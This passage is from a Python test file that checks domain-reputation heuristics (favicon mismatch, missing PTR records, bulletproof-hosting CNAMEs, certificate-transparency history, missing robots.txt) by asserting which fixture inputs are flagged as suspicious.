    def test_no_favicon_is_neutral(self, make_context):
        ctx = make_context(favicon=None)
        result = FaviconBrandMismatchHeuristic().evaluate(ctx)
        assert result.suspicious is False


class TestReverseDnsMismatchHeuristic:
    """Tests for ReverseDnsMismatchHeuristic."""

    def test_a_records_with_no_ptr_is_suspicious(self, make_context):
        ctx = make_context(a_records=["1.2.3.4"], ptr_records=[])
        result = ReverseDnsMismatchHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_ptr_records_present_is_neutral(self, make_context):
        ctx = make_context(a_records=["1.2.3.4"], ptr_records=["host.example.com."])
        result = ReverseDnsMismatchHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_no_a_records_is_neutral(self, make_context):
        ctx = make_context(a_records=[], ptr_records=[])
        result = ReverseDnsMismatchHeuristic().evaluate(ctx)
        assert result.suspicious is False


# ---------------------------------------------------------------------------
# Group C — New heuristics (moderate new I/O data)
# ---------------------------------------------------------------------------

class TestBulletproofHostHeuristic:
    """Tests for BulletproofHostHeuristic.

    TEST_CONFIG has bulletproof_hosting_substrings=["bulletproof-host"].
    """

    def test_cname_contains_bulletproof_substring_is_suspicious(self, make_context):
        ctx = make_context(cname=CnameInfo(chain=["evil.bulletproof-host.net."], error=None))
        result = BulletproofHostHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_cname_empty_chain_is_neutral(self, make_context):
        ctx = make_context(cname=CnameInfo(chain=[], error=None))
        result = BulletproofHostHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_no_cname_info_is_neutral(self, make_context):
        ctx = make_context(cname=None)
        result = BulletproofHostHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_cname_to_legitimate_cdn_is_neutral(self, make_context):
        ctx = make_context(cname=CnameInfo(chain=["cdn.cloudflare.com."], error=None))
        result = BulletproofHostHeuristic().evaluate(ctx)
        assert result.suspicious is False


class TestCtHistoryHeuristic:
    """Tests for CtHistoryHeuristic.

    TEST_CONFIG has ct_few_certs=2, new_domain_days=30.
    """

    def _fresh_iso(self, days_ago: int) -> str:
        dt = datetime.now(timezone.utc) - timedelta(days=days_ago)
        return dt.strftime("%Y-%m-%dT%H:%M:%SZ")

    def test_single_cert_ever_is_suspicious(self, make_context):
        ctx = make_context(ct=CtInfo(cert_count=1, earliest_date=self._fresh_iso(5), error=None))
        result = CtHistoryHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_two_certs_and_new_domain_is_suspicious(self, make_context):
        ctx = make_context(
            ct=CtInfo(cert_count=2, earliest_date=self._fresh_iso(10), error=None),
            registration=RegistrationInfo(created=self._fresh_iso(10), registrar=None, error=None),
        )
        result = CtHistoryHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_many_certs_is_neutral(self, make_context):
        ctx = make_context(ct=CtInfo(cert_count=10, earliest_date=self._fresh_iso(500), error=None))
        result = CtHistoryHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_no_ct_info_is_neutral(self, make_context):
        ctx = make_context(ct=None)
        result = CtHistoryHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_zero_cert_count_is_neutral(self, make_context):
        ctx = make_context(ct=CtInfo(cert_count=0, earliest_date=None, error=None))
        result = CtHistoryHeuristic().evaluate(ctx)
        assert result.suspicious is False


class TestRobotsTxtHeuristic:
    """Tests for RobotsTxtHeuristic."""

    def test_active_domain_without_robots_is_suspicious(self, make_context):
        ctx = make_context(status=200, a_records=["1.2.3.4"], robots_txt=None)
        result = RobotsTxtHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_robots_txt_present_is_neutral(self, make_context):
        ctx = make_context(status=200, a_records=["1.2.3.4"], robots_txt="User-agent: *\nDisallow: /admin")
        result = RobotsTxtHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_non_200_status_is_neutral(self, make_context):
        ctx = make_context(status=404, a_records=["1.2.3.4"], robots_txt=None)
        result = RobotsTxtHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_no_a_records_is_neutral(self, make_context):
        ctx = make_context(status=200, a_records=[], robots_txt=None)
        result = RobotsTxtHeuristic().evaluate(ctx)
        assert result.suspicious is False
